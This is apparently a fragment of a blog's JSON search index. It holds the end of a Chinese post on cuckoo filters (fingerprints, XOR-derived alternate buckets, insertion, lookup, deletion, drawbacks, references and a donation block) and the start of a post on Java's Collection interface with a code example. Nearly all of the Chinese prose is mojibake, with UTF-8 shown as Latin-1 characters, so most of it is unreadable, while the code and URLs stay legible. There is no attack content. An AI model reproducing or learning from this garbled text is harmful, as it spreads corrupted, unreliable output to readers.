åŸç†\n\nå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨çš„å¸ƒè°·é¸Ÿå“ˆå¸Œè¡¨çš„åŸºæœ¬å•ä½ç§°ä¸º**æ¡ç›®ï¼ˆentryï¼‰**ï¼Œæ¯ä¸ªæ¡ç›®å­˜å‚¨ä¸€ä¸ª**æŒ‡çº¹ï¼ˆfingerprintï¼‰**\n\n**æŒ‡çº¹ï¼š**å¯¹æ’å…¥çš„ key ä½¿ç”¨ä¸€ä¸ªå“ˆå¸Œå‡½æ•°ç”Ÿæˆçš„ n ä½æ¯”ç‰¹ä½ï¼Œn çš„å…·ä½“å¤§å°ç”±æ‰€èƒ½æ¥å—çš„è¯¯åˆ¤ç‡æ¥è®¾ç½®ï¼Œè®ºæ–‡ä¸­çš„ä¾‹å­ä½¿ç”¨çš„æ˜¯ 8 bits çš„æŒ‡çº¹å¤§å°ã€‚ç‰ºç‰²äº†ä¸€å®šç²¾åº¦ï¼Œä½†æ˜¯æ¢å–äº†ç©ºé—´ã€‚\n\nä¸å¸ƒè°·é¸Ÿå“ˆå¸Œä¸åŒï¼Œå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨é‡‡å–äº†ä¸¤ä¸ª**å¹¶ä¸ç‹¬ç«‹çš„å“ˆå¸Œå‡½æ•°**ï¼Œå…·ä½“çš„å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ä½ç½®è®¡ç®—å…¬å¼ï¼š\n\n```python\nf = fingerprint(x)\ni1 = hash(x)\ni2 = i1 âŠ• hash(f)\n\n# i1 å’Œ i2 å³ä¸ºè®¡ç®—å‡ºæ¥ä¸¤ä¸ªæ¡¶çš„ç´¢å¼•\n```\n\n**ä¸ºä»€ä¹ˆé‡‡ç”¨å¹¶ä¸ç‹¬ç«‹çš„å“ˆå¸Œå‡½æ•°ï¼Ÿåˆä¸ºä»€ä¹ˆéœ€è¦ç”¨åˆ°å¼‚æˆ–å‘¢ï¼Ÿ**\n\nå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨æ’å…¥å…ƒç´ æ—¶ä¼šæœ‰é¢‘ç¹çš„è¸¢å‡ºæ“ä½œï¼Œå½“æŸä¸ªå€¼ x è¢«è¸¢å‡ºæ—¶ï¼Œéœ€è¦æ‰¾åˆ°å¦å¤–ä¸€ä¸ªä½ç½®ã€‚ Cuckoo Hash æ˜¯é€šè¿‡é¢å¤–å“ˆå¸Œå‡½æ•°ä½œç”¨äº x è®¡ç®—è€Œå‡ºï¼š`i2`ã€‚\n\nä½†åœ¨ Cuckoo Filter ä¸­ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œä¿å­˜çš„æ˜¯å®šé•¿çš„æŒ‡çº¹ `finger(x)` è€ŒéåŸå€¼ xã€‚å½“ x è¢«è¸¢å‡ºæ—¶ï¼Œå¦‚ä½•æ‰¾åˆ°å…¶å¦å¤–ä¸€ä¸ªä½ç½®ï¼Ÿç›´è§‚çš„ï¼Œæˆ‘æœ‰ä¸¤ç§æƒ³æ³•ï¼š\n\n- æ–¹æ³•ä¸€ï¼šé€šè¿‡ `h2(finger(x))` è®¡ç®—å‡ºå¦å¤–ä¸€ä¸ªä½ç½®ã€‚ä½†è¿™æ ·åœ¨è®¡ç®—ç¬¬äºŒä¸ªä½ç½®æ—¶ï¼Œç›¸å½“äºå°†åŸæ•°æ®ç©ºé—´å¼ºè¡Œå‹ç¼©åˆ°äº†æŒ‡çº¹ç©ºé—´ï¼Œä¼šæŸå¤±å¾ˆå¤šä¿¡æ¯ï¼ŒåŠ å¤§ç¢°æ’æ¦‚ç‡ã€‚\n\n- æ–¹æ³•äºŒï¼šåœ¨å€¼ä¸­è®°ä¸‹å¦å¤–ä¸€ä¸ªä½ç½®`(finger,other position)`ï¼Œä½†è¿™æ ·ç©ºé—´å ç”¨ä¼šå¤§å¤§å¢åŠ ã€‚\n\nCuckoo Filter ç”¨äº†ä¸€ä¸ªå·§å¦™åœ°åšæ³•ï¼Œå°†**ä½ç½®** `i1`å’Œè¯¥ä½ç½®é‡Œé¢å­˜å‚¨çš„â€œæŒ‡çº¹â€ä¿¡æ¯çš„ Hashå€¼ `hash(f)` è¿›è¡Œ**å¼‚æˆ–**å¾—åˆ°å¦å¤–ä¸€ä¸ªä½ç½®ã€‚\n\n- å› ä¸ºå¼‚æˆ–çš„è‡ªåæ€§ï¼š`A âŠ• B âŠ• B = A`\n\n- è¿™æ ·å°±ä¸éœ€è¦çŸ¥é“å½“å‰çš„ä½ç½®æ˜¯ i1 è¿˜æ˜¯ i2ï¼Œåªéœ€è¦å°†å½“å‰çš„ä½ç½®å’Œè¯¥ä½ç½®é‡Œé¢å­˜å‚¨çš„â€œæŒ‡çº¹â€ä¿¡æ¯çš„Hashå€¼è¿›è¡Œå¼‚æˆ–è®¡ç®—å°±å¯ä»¥å¾—åˆ°å¦ä¸€ä¸ªä½ç½®ã€‚\n- è€Œä¸”åªéœ€è¦ç¡®ä¿ hash(f) != 0 å°±å¯ä»¥ç¡®ä¿ i1 != i2ï¼Œå¦‚æ­¤å°±ä¸ä¼šå‡ºç°è‡ªå·±è¸¢è‡ªå·±å¯¼è‡´æ­»å¾ªç¯çš„é—®é¢˜ã€‚\n\n**ä¸ºä»€ä¹ˆ i1 ä¸ç›´æ¥å’ŒæŒ‡çº¹ f è¿›è¡Œå¼‚æˆ– æ¥è®¡ç®— i2 ï¼Ÿ**\n\n- å¦‚æœç›´æ¥è¿›è¡Œå¼‚æˆ–å¤„ç†(i2 = i1 âŠ• f)ï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½ i1 å’Œ i2 çš„ä½ç½®ç›¸éš”å¾ˆè¿‘\n- å› ä¸ºæŒ‡çº¹ f ä¸€èˆ¬ä½æ•°æ¯”è¾ƒå°‘ï¼Œæ¯”å¦‚ 8 bitã€‚å¦‚æœæŒ‰ç…§è¿™ç§æ–¹æ³•ï¼Œå³æ˜¯åœ¨åŸä½ç½® Â±2^8 = 256 çš„èŒƒå›´å†…æ‰¾åˆ°å¦ä¸€ä¸ªä½ç½®ï¼Œå¼‚æˆ–åªä¼šæ”¹å˜ä½ 8 bit çš„å€¼ã€‚è¿™ä¸ªèŒƒå›´å¤ªå°äº†ï¼Œä¸åˆ©äºå‡è¡¡æ•£åˆ—ã€‚å°¤å…¶æ˜¯åœ¨æ¯”è¾ƒå°çš„ hash è¡¨ä¸­ï¼Œè¿™æ ·æ— å½¢ä¹‹ä¸­å¢åŠ äº†ç¢°æ’çš„æ¦‚ç‡ã€‚\n\n###  æ’å…¥\n\n![](https://img.jwt1399.top/img/image-20220330223308276.png)\n\nå‡è®¾å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨é‡Œé¢æœ‰ä¸¤ä¸ª hash è¡¨ T1ã€T2ï¼Œä¸¤ä¸ª hash è¡¨ï¼Œå¯¹åº”ä¸€ä¸ª hash å‡½æ•° H1\n\nå…·ä½“çš„æ’å…¥æ­¥éª¤å¦‚ä¸‹ï¼š[å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨åŠ¨æ€æ¼”ç¤º](file:///Users/jianjian/Desktop/cuckoo/index.html)\n\n1. å½“ä¸€ä¸ªä¸å­˜åœ¨çš„å…ƒç´ æ’å…¥çš„æ—¶å€™ï¼Œä¼šå…ˆæ ¹æ® H1 è®¡ç®—å‡ºå…¶åœ¨ T1 è¡¨çš„ä½ç½® i1ï¼Œå¦‚æœè¯¥ä½ç½®ä¸ºç©ºåˆ™å¯ä»¥æ”¾è¿›å»ã€‚\n2. å¦‚æœè¯¥ä½ç½®ä¸ä¸ºç©ºï¼Œåˆ™æ ¹æ®å…¬å¼è®¡ç®—å‡ºå…¶åœ¨ T2 è¡¨çš„ä½ç½® i2ï¼Œå¦‚æœè¯¥ä½ç½®ä¸ºç©ºåˆ™å¯ä»¥æ”¾è¿›å»ã€‚\n3. å¦‚æœ T1 è¡¨å’Œ T2 è¡¨çš„ä½ç½®å…ƒç´ éƒ½ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå°±éšæœºçš„é€‰æ‹©ä¸€ä¸ª hash è¡¨å°†å…¶å…ƒç´ è¸¢å‡ºã€‚\n4. è¢«è¸¢å‡ºçš„å…ƒç´ ä¼šå»æ‰¾è‡ªå·±çš„å¦ä¸€ä¸ªä½ç½®ï¼Œå¦‚æœè¢«å äº†ä¹Ÿä¼šéšæœºé€‰æ‹©ä¸€ä¸ªå°†å…¶è¸¢å‡ºï¼Œè¢«è¸¢å‡ºçš„å…ƒç´ åˆä¼šå»æ‰¾è‡ªå·±çš„å¦ä¸€ä¸ªä½ç½®\n5. å¦‚æœå‡ºç°å¾ªç¯è¸¢å‡ºå¯¼è‡´æ”¾ä¸è¿›å…ƒç´ çš„æƒ…å†µï¼Œé‚£ä¹ˆä¼šè®¾ç½®ä¸€ä¸ªé˜ˆå€¼ï¼Œè¶…å‡ºäº†æŸä¸ªé˜ˆå€¼ï¼Œå°±è®¤ä¸ºè¿™ä¸ª hash è¡¨å·²ç»å‡ ä¹æ»¡äº†ï¼Œè¿™æ—¶å€™å°±éœ€è¦å¯¹å®ƒè¿›è¡Œæ‰©å®¹ï¼Œé‡æ–°æ”¾ç½®æ‰€æœ‰å…ƒç´ ã€‚\n\n![Cuckoo Filter Insert](https://img.jwt1399.top/img/20210228113219.png)\n\nå¦‚æœæƒ³è¦æ’å…¥ä¸€ä¸ªå…ƒç´  Z åˆ°è¿‡æ»¤å™¨é‡Œï¼š\n\n1. é¦–å…ˆä¼šå°† Z è¿›è¡Œ hash è®¡ç®—ï¼Œå‘ç° T1 å’Œ T2 å¯¹åº”çš„æ§½ä½1å’Œæ§½ä½2éƒ½å·²ç»è¢«å äº†ï¼›\n2. éšæœºå°† T1 ä¸­çš„æ§½ä½1ä¸­çš„å…ƒç´  X è¸¢å‡ºï¼ŒX çš„ T2 å¯¹åº”çš„æ§½ä½4å·²ç»è¢«å…ƒç´  3 å äº†ï¼›\n3. å°† T2 ä¸­çš„æ§½ä½4ä¸­çš„å…ƒç´  3 è¸¢å‡ºï¼Œå…ƒç´  3 åœ¨ hash è®¡ç®—ä¹‹åå‘ç° T1 çš„æ§½ä½6æ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆå°†å…ƒç´ 3æ”¾å…¥åˆ° T1 çš„æ§½ä½6ä¸­ã€‚\n\nå®é™…ä¸Šå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ä¸­åªä¼šå­˜å‚¨å…ƒç´ çš„å‡ ä¸ª bit ï¼Œç§°ä½œæŒ‡çº¹ä¿¡æ¯ã€‚è¿™é‡Œæ˜¯ç‰ºç‰²äº†æ•°æ®çš„ç²¾ç¡®æ€§æ¢å–äº†ç©ºé—´æ•ˆç‡ã€‚\n\nä¸Šé¢çš„å®ç°æ–¹æ¡ˆä¸­ï¼Œhash è¡¨ä¸­æ¯ä¸ªæ§½ä½åªèƒ½å­˜æ”¾ä¸€ä¸ªå…ƒç´ ï¼Œç©ºé—´åˆ©ç”¨ç‡åªæœ‰ 50%\n\nå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ä¸­æ¯ä¸ªæ§½ä½å¯ä»¥å­˜æ”¾å¤šä¸ªå…ƒç´ ï¼Œä»ä¸€ç»´å˜æˆäº†äºŒç»´ã€‚å½“æ¯ä¸ªæ§½ä½å¯ä»¥å­˜æ”¾ 2ï¼Œ4ï¼Œ8 ä¸ªå…ƒç´ çš„æ—¶å€™ï¼Œç©ºé—´åˆ©ç”¨ç‡å°±ä¼šé£™å‡åˆ° 84%ï¼Œ95%ï¼Œ98%\n\nå¦‚ä¸‹å›¾ï¼Œè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæ¯ä¸ªæ§½ä½å¯ä»¥å­˜æ”¾ 4 ä¸ªå…ƒç´ ï¼Œå’Œä¸Šé¢çš„å®ç°æœ‰æ‰€ä¸åŒçš„æ˜¯ï¼Œæ²¡æœ‰é‡‡ç”¨ä¸¤ä¸ªæ•°ç»„æ¥å­˜æ”¾ï¼Œè€Œæ˜¯åªç”¨äº†ä¸€ä¸ª\n\n![](https://img.jwt1399.top/img/20210228113226.png)\n\n### æŸ¥æ‰¾\n\n![](https://img.jwt1399.top/img/image-20220330223231679.png)\n\nå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨çš„æŸ¥æ‰¾è¿‡ç¨‹å¾ˆç®€å•\n\n- ç»™å®šä¸€ä¸ªé¡¹ xï¼Œç®—æ³•é¦–å…ˆæ ¹æ®æ’å…¥å…¬å¼ï¼Œè®¡ç®— x çš„æŒ‡çº¹å’Œä¸¤ä¸ªå€™é€‰æ¡¶ i1 å’Œ i2\n- ç„¶åè¯»å–è¿™ä¸¤ä¸ªæ¡¶ï¼šå¦‚æœä»»æ„æ¡¶ä¸ç°æœ‰æŒ‡çº¹åŒ¹é…ï¼Œåˆ™å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨è¿”å› trueï¼Œå¦åˆ™è¿‡æ»¤å™¨è¿”å› falseã€‚\n- åªè¦ä¸å‘ç”Ÿæ¡¶æº¢å‡ºï¼Œå°±å¯ä»¥ç¡®ä¿æ²¡æœ‰å‡é˜´æ€§ã€‚\n\n### åˆ é™¤\n\n![](https://img.jwt1399.top/img/image-20220330223212233.png)\n\n- æ ‡å‡†å¸ƒéš†è¿‡æ»¤å™¨ä¸èƒ½åˆ é™¤ï¼Œå› æ­¤åˆ é™¤å•ä¸ªé¡¹éœ€è¦é‡å»ºæ•´ä¸ªè¿‡æ»¤å™¨\n- è€Œè®¡æ•°å¸ƒéš†è¿‡æ»¤å™¨éœ€è¦æ›´å¤šçš„ç©ºé—´\n- å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨å°±åƒè®¡æ•°å¸ƒéš†è¿‡æ»¤å™¨ï¼Œå¯ä»¥é€šè¿‡ä»å“ˆå¸Œè¡¨åˆ é™¤ç›¸åº”çš„æŒ‡çº¹ï¼Œå…¶ä»–å…·æœ‰ç±»ä¼¼åˆ é™¤è¿‡ç¨‹çš„è¿‡æ»¤å™¨æ¯”å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨æ›´å¤æ‚ã€‚\n\nå…·ä½“åˆ é™¤çš„è¿‡ç¨‹ä¹Ÿå¾ˆç®€å•\n\n- æ£€æŸ¥ç»™å®šé¡¹çš„ä¸¤ä¸ªå€™é€‰æ¡¶ï¼›å¦‚æœä»»ä½•æ¡¶ä¸­çš„æŒ‡çº¹åŒ¹é…ï¼Œåˆ™ä»è¯¥æ¡¶ä¸­åˆ é™¤åŒ¹é…æŒ‡çº¹çš„ä¸€ä»½å‰¯æœ¬ã€‚\n\nå¯¹é‡å¤æ•°æ®è¿›è¡Œé™åˆ¶ï¼šå¦‚æœéœ€è¦å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨æ”¯æŒåˆ é™¤ï¼Œå®ƒå¿…é¡»çŸ¥é“ä¸€ä¸ªæ•°æ®æ’å…¥è¿‡å¤šå°‘æ¬¡ã€‚ä¸èƒ½è®©åŒä¸€ä¸ªæ•°æ®æ’å…¥ kb+1 æ¬¡ã€‚å…¶ä¸­ k æ˜¯ hash å‡½æ•°çš„ä¸ªæ•°ï¼Œb æ˜¯ä¸€ä¸ªä¸‹æ ‡çš„ä½ç½®èƒ½æ”¾å‡ ä¸ªå…ƒç´ ã€‚\n\næ¯”å¦‚ 2 ä¸ª hash å‡½æ•°ï¼Œä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œå®ƒçš„æ¯ä¸ªä¸‹æ ‡æœ€å¤šå¯ä»¥æ’å…¥ 4 ä¸ªå…ƒç´ ã€‚é‚£ä¹ˆå¯¹äºåŒä¸€ä¸ªå…ƒç´ ï¼Œæœ€å¤šæ”¯æŒæ’å…¥ 8 æ¬¡ã€‚\n\n### ç¼ºç‚¹\n\n- **åˆ é™¤ä¸å®Œç¾ï¼Œå­˜åœ¨è¯¯åˆ çš„æ¦‚ç‡ã€‚**åˆ é™¤çš„æ—¶å€™åªæ˜¯åˆ é™¤äº†ä¸€ä»½æŒ‡çº¹å‰¯æœ¬ï¼Œå¹¶ä¸èƒ½ç¡®å®šæ­¤æŒ‡çº¹å‰¯æœ¬æ˜¯è¦åˆ é™¤çš„ key çš„æŒ‡çº¹ã€‚åŒæ—¶è¿™ä¸ªé—®é¢˜ä¹Ÿå¯¼è‡´äº†å‡é˜³æ€§çš„æƒ…å†µã€‚\n- **æ’å…¥å¤æ‚åº¦æ¯”è¾ƒé«˜ã€‚**éšç€æ’å…¥å…ƒç´ çš„å¢å¤šï¼Œå¤æ‚åº¦ä¼šè¶Šæ¥è¶Šé«˜ï¼Œå› ä¸ºå­˜åœ¨æ¡¶æ»¡ï¼Œè¸¢å‡ºçš„æ“ä½œï¼Œæ‰€ä»¥éœ€è¦é‡æ–°è®¡ç®—ï¼Œä½†ç»¼åˆæ¥è®²å¤æ‚åº¦è¿˜æ˜¯å¸¸æ•°çº§åˆ«ã€‚\n- **å­˜å‚¨ç©ºé—´çš„å¤§å°å¿…é¡»ä¸º2çš„æŒ‡æ•°**çš„é™åˆ¶è®©ç©ºé—´æ•ˆç‡æ‰“äº†æŠ˜æ‰£ã€‚\n- **åŒä¸€ä¸ªå…ƒç´ æœ€å¤šæ’å…¥kbæ¬¡**ï¼Œï¼ˆkæŒ‡å“ˆå¸Œå‡½æ•°çš„ä¸ªæ•°ï¼ŒbæŒ‡çš„æ¡¶ä¸­èƒ½è£…æŒ‡çº¹çš„ä¸ªæ•°ä¹Ÿå¯ä»¥è¯´æ˜¯æ¡¶çš„å°ºå¯¸å¤§å°ï¼‰å¦‚æœå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨æ”¯æŒåˆ é™¤ï¼Œåˆ™å¿…é¡»å­˜å‚¨åŒä¸€é¡¹çš„å¤šä¸ªå‰¯æœ¬ã€‚ æ’å…¥åŒä¸€é¡¹kb+1æ¬¡å°†å¯¼è‡´æ’å…¥å¤±è´¥ã€‚ è¿™ç±»ä¼¼äºè®¡æ•°å¸ƒéš†è¿‡æ»¤å™¨ï¼Œå…¶ä¸­é‡å¤æ’å…¥ä¼šå¯¼è‡´è®¡æ•°å™¨æº¢å‡ºã€‚\n\n### å‚è€ƒ\n\n- [å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ï¼ˆCuckoo Filterï¼‰](https://www.cnblogs.com/zhaodongge/p/15067657.html)\n- [åŸºäºåŸè®ºæ–‡ï¼Œæˆ‘å®ç°äº†ä¸€ä¸ªæ›´å…¨é¢çš„å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ ](https://segmentfault.com/a/1190000039296155)\n- [Goè¯­è¨€å®ç°å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨](https://www.luozhiyun.com/archives/453)\n- [ã€åˆ†å¸ƒå¼ã€‘Bloom Filter ä¸ Cuckoo Filter](https://zhuanlan.zhihu.com/p/131285273)\n- è®ºæ–‡ï¼š[å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ï¼šå®é™…ä¸Šä¼˜äºå¸ƒéš†è¿‡æ»¤å™¨ (linvon.cn)](http://www.linvon.cn/posts/cuckoo/)\n- CPPå®ç°å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ï¼šhttps://github.com/efficient/cuckoofilter\n- [Cuckoo Hashing Visualization :: Laszlo Kozma (lkozma.net)](http://www.lkozma.net/cuckoo_hashing_visualization/)\n- [å¸ƒéš†ï¼Œç‰›é€¼ï¼å¸ƒè°·é¸Ÿï¼Œç‰›é€¼ï¼](https://segmentfault.com/a/1190000039156246)\n- [å¸ƒè°·é¸Ÿå“ˆå¸Œå’Œå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨ | æœ¨é¸Ÿæ‚è®°](https://www.qtmuniao.com/2021/12/07/cuckoo-hash-and-cuckoo-filter)\n\n## ä¸¤ç§è¿‡æ»¤å™¨æ¯”è¾ƒ\n\n![](https://img.jwt1399.top/img/1617168-20210727195622317-1553292086.png)\n\nä¸Šå›¾æ˜¯å¸ƒè°·é¸Ÿè¿‡æ»¤å™¨å…¶ä»–è¿‡æ»¤å™¨æ¯”è¾ƒï¼Œå‡é˜³æ€§ç‡ä¸æ¯ä¸ªå…ƒç´ çš„ç©ºé—´æˆæœ¬ã€‚\n\nå¯¹äºä½å‡é˜³æ€§ç‡ï¼ˆä½äº3%ï¼‰ï¼Œå¸ƒè°·é¸Ÿè¿‡æ»¤å™¨æ¯”ç©ºé—´ä¼˜åŒ–çš„å¸ƒéš†è¿‡æ»¤å™¨æ¯ä¸ªå…ƒç´ éœ€è¦æ›´å°‘çš„å­˜å‚¨ç©ºé—´ã€‚\n\n\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["æ•°æ®ç»“æ„"],"categories":["ç»“æ„-ç®—æ³•"]},{"title":"Java-é›†åˆ","url":"/posts/6773.html","content":"\n##  å‰è¨€\n\nå“ˆå–½ï¼å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°ç®€ã€‚ä»Šå¤©å¼€å§‹å­¦ä¹ ã€ŠJava-é›†åˆã€‹ï¼Œæ­¤ç³»åˆ—æ˜¯æˆ‘åšçš„ä¸€ä¸ª â€œJava ä» 0 åˆ° 1 â€ å®éªŒï¼Œç»™è‡ªå·±ä¸€å¹´å·¦å³æ—¶é—´ï¼ŒæŒ‰ç…§æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html)ï¼Œä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡7å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š03-20\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š03-28\n- [x] ğŸ€æ€»ç»“ï¼šè¶…æ—¶å•¦ï¼è¿™å‘¨èŠ±äº†ä¸€åŠæ—¶é—´çœ‹è®ºæ–‡ï¼Œè€½æå•¦ï¼é›†åˆè¿™ç« èŠ‚æ˜¯éš¾ç‚¹ä¹Ÿæ˜¯é‡ç‚¹ï¼Œç®—æ˜¯å‹‰å‹‰å¼ºå¼ºç®—å­¦å®Œäº†ï¼Œè¿˜ä¸æ˜¯å¾ˆç†Ÿï¼Œåç»­å†åŠ å¼ºå§ã€‚\n\n## é›¶ã€é›†åˆç®€ä»‹\n\n### é›†åˆçš„å¥½å¤„\n\nå‰é¢æˆ‘ä»¬ä¿å­˜å¤šä¸ªæ•°æ®ä½¿ç”¨çš„æ˜¯æ•°ç»„ï¼Œä½†æ˜¯æ•°ç»„æœ‰ä¸è¶³çš„åœ°æ–¹ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹\n\n- æ•°ç»„\n  - 1)é•¿åº¦å¼€å§‹æ—¶å¿…é¡»æŒ‡å®šï¼Œè€Œä¸”ä¸€æ—¦æŒ‡å®šï¼Œä¸èƒ½æ›´æ”¹\n  - 2)ä¿å­˜çš„å¿…é¡»ä¸ºåŒä¸€ç±»å‹çš„å…ƒç´ \n  - 3)ä½¿ç”¨æ•°ç»„è¿›è¡Œå¢åŠ /åˆ é™¤å…ƒç´ æ¯”è¾ƒéº»çƒ¦\n- é›†åˆ\n  - 1)å¯ä»¥åŠ¨æ€ä¿å­˜ä»»æ„å¤šä¸ªå¯¹è±¡ï¼Œä½¿ç”¨æ¯”è¾ƒæ–¹ä¾¿!\n  - 2)æä¾›äº†ä¸€ç³»åˆ—æ–¹ä¾¿çš„æ“ä½œå¯¹è±¡çš„æ–¹æ³•: addã€removeã€setã€getç­‰\n  - 3)ä½¿ç”¨é›†åˆæ·»åŠ ï¼Œåˆ é™¤æ–°å…ƒç´ ç®€æ´äº†\n\n### é›†åˆçš„æ¡†æ¶ä½“ç³»\n\nJava çš„é›†åˆç±»å¾ˆå¤šï¼Œä¸»è¦åˆ†ä¸ºä¸¤å¤§ç±»(å•åˆ—é›†åˆå’ŒåŒåˆ—é›†åˆ)\n\n| å•åˆ—é›†åˆ | åŒåˆ—é›†åˆ |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/image-20220320114407307.png) | ![](https://img.jwt1399.top/img/image-20220320114413942.png) |\n\n## ä¸€ã€Collection\n\n### ç‰¹ç‚¹\n\n```java\npublic interface Collection<E> extends Iterable< E>\n```\n\n- Collection å®ç°å­ç±»å¯ä»¥å­˜æ”¾å¤šä¸ªå…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ å¯ä»¥æ˜¯ Object\n- Collection çš„å®ç°ç±»ï¼Œæœ‰äº›å¯ä»¥å­˜æ”¾é‡å¤çš„å…ƒç´ ï¼Œæœ‰äº›ä¸å¯ä»¥\n- Collection çš„å®ç°ç±»ï¼Œæœ‰äº›æ˜¯æœ‰åºçš„(List)ï¼Œæœ‰äº›ä¸æ˜¯æœ‰åº(Set)\n\n- Collection æ¥å£**æ²¡æœ‰ç›´æ¥çš„å®ç°å­ç±»**ï¼Œæ˜¯é€šè¿‡å®ƒçš„å­æ¥å£ List å’Œ Set æ¥å®ç°çš„\n\n### å¸¸ç”¨æ–¹æ³•\n\n- add() æ·»åŠ å•ä¸ªå…ƒç´ \n- remove() åˆ é™¤æŒ‡å®šå…ƒç´ \n  - remove(index) //åˆ é™¤æŒ‡å®šç´¢å¼•å…ƒç´ \n  - remove(Object) //åˆ é™¤æŒ‡å®šæŸä¸ªå…ƒç´ \n- contains() æŸ¥æ‰¾å…ƒç´ æ˜¯å¦å­˜åœ¨\n- size() è·å–å…ƒç´ ä¸ªæ•°\n- isEmpty() åˆ¤æ–­æ˜¯å¦ä¸ºç©º\n- clear() æ¸…ç©º\n- addAll(Collection) æ·»åŠ å¤šä¸ªå…ƒç´ \n- containsAll(Collection) æŸ¥æ‰¾å¤šä¸ªå…ƒç´ æ˜¯å¦éƒ½å­˜åœ¨\n- removeAll(Collection)  åˆ é™¤å¤šä¸ªå…ƒç´ \n\n```java\npackage com.jwt.collection_;\n\nimport java.util.ArrayList;\nimport java.util.Collection;\n\npublic class CollectionMethod {\n    public static void main(String[] args) {\n        // è¯´æ˜ï¼šä»¥Arraycol å®ç°ç±»æ¥æ¼”ç¤º\n        Collection col = new ArrayList();\n        // add:æ·»åŠ å•ä¸ªå…ƒç´ \n        col.add(\"jack\");\n        col.add(10);//col.add(new Integer(10))\n        col.add(true);\n        System.out.println(\"col=\" + col);\n        // remove:åˆ é™¤æŒ‡å®šå…ƒç´ \n        col.remove(0);//åˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´ \n        System.out.println(\"col=\" + col);\n        col.remove(true);//æŒ‡å®šåˆ é™¤æŸä¸ªå…ƒç´ \n        System.out.println(\"col=\" + col);\n        // contains:æŸ¥æ‰¾å…ƒç´ æ˜¯å¦å­˜åœ¨\n        System.out.println(col.contains(\"jack\"));//F\n        // size:è·å–å…ƒç´ ä¸ªæ•°\n        System.out.println(col.size());//1\n        // isEmpty:åˆ¤æ–­æ˜¯å¦ä¸ºç©º\n        System.out.println(col.isEmpty());//F\n        // clear:æ¸…ç©º\n        col.clear();\n        System.out.println(\"col=\" + col);\n        // addAll:æ·»åŠ å¤šä¸ªå…ƒç´ \n        Collection col2 = new ArrayList();\n        col2.add(\"çº¢æ¥¼æ¢¦\");\n        col2.add(\"ä¸‰å›½æ¼”ä¹‰\");\n        col.addAll(col2);\n        System.out.println(\"col2=\" + col2);\n        System.out.println(\"col=\" + col);\n        // containsAll:æŸ¥æ‰¾å¤šä¸ªå…ƒç´ æ˜¯å¦éƒ½å­˜åœ¨\n        System.out.println(col.containsAll(col2));//T\n        // removeAllï¼šåˆ é™¤å¤šä¸ªå…ƒç´ \n        col.add(\"èŠæ–‹\");\n        col.removeAll(col2);\n        System.out.println(\"col=\" + col);//[èŠæ–‹]\n    }\n}\n```\n\n### éå†\n\n#### Iteratoréå†\n\n##### ç®€ä»‹\n\n- Iterator å¯¹è±¡ç§°ä¸ºè¿­ä»£å™¨ï¼Œ ä¸»è¦ä»…ç”¨äºéå† Collection é›†åˆä¸­çš„å…ƒç´ ï¼ŒIterator 